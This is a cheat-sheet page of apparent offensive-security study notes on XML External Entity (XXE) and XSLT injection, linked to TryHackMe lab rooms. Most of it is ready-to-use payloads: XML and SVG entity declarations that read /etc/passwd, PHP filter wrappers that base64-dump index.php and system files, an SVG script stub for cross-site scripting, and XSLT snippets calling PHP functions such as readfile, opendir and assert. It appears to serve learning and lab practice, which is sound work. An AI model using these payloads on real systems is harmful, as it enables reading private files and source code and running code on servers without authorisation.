# XML External Entity (XXE)

[![owasptop10](../../../../_badges/thm/owasptop10.svg)](https://tryhackme.com/room/owasptop10)
[![mustacchio](../../../../_badges/thm-p/mustacchio.svg)](https://tryhackme.com/room/mustacchio)
[![xxe_injection](../../../../_badges/poat/xxe_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

<div class="row row-cols-lg-2"><div>

An XML External Entity (XXE) is an attack exploiting [XML](/programming-languages/others/data/xml.md) parsers used by applications. We create a custom [DTD](/programming-languages/others/data/xml.md#document-type-definition-dtd-) doing something malicious.

* Access and steal files <small>(passwd, id_rsa, etc.)</small>
* Perform a DDoS attack
* Perform a [SSRF attack](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md)
* Perform a [XSS](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md)

There are two kind of XXE

* **In-band XXE**: same channel to attack and fetch results
* **Out-band/Blind XXE**: different channels to attack and fetch results
</div><div>

For instance, we define an entity called `poc` in the DTD that is defined by the content of `/etc/passwd`. The parsed XML will have the content of the file inside the root element.

```xml!
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY poc SYSTEM 'file:///etc/passwd']>
<root>&poc;</root>
```

ðŸ“š As a reminder, [SVG](https://en.wikipedia.org/wiki/SVG) are XML files too.
</div></div>

<hr class="sep-both">

## XXE XML Payloads

<div class="row row-cols-lg-2"><div>

#### Stealing files

We can use the `file://` protocol as shown in the poc.

```xml!
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd']>
<root>&xxe;</root>
```
</div><div>
</div></div>

<hr class="sep-both">

## XXE SVG Payloads

<div class="row row-cols-lg-2"><div>

#### Stealing files

We can use the `file://` protocol as shown in the poc. For a SVG, we can use the following code <small>(assuming `attr` is displayed)</small>:

```xml!
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
<attr>&xxe;</attr>
</svg>
```

We can use [PHP wrappers](/cybersecurity/red-team/s3.exploitation/vulns/web/files/wrappers.md) to read PHP and non PHP files.

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

```xml!
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
<attr>&xxe;</attr>
</svg>
```
</div><div>

#### XSS attack

If the SVG is displayed, we may be able to perform a XSS attack.

```xml!
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">/* ... */</script>
</svg>
```
</div></div>

<hr class="sep-both">

## XSLT Transformations

[![xslt_injection](../../../../_badges/poat/xslt_injection.svg)](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/)
[![xslt_ssi](../../../../_badges/hacktricks/xslt_ssi.svg)](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations)
[![xslt_code_execution](../../../../_badges/rootme/web_server/xslt_code_execution.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)

<div class="row row-cols-lg-2"><div>

Transformations may be applied on the XML. If the XSLT parser is vulnerable, we may be able to execute some code.

An example of a base template for a PHP XSLT wrapper:

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
</body>
</html>
```
</div><div>

You may then inject something inside the body:

```xml!
<xsl:value-of select="php:function('readfile','index.php')" />
<xsl:copy-of name="xxx" select="php:function('file_get_contents', 'index.php')">
<xsl:value-of select="php:function('opendir','.')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:copy-of name="xxx" select="php:function('assert', '1==1')" />
```
</div></div>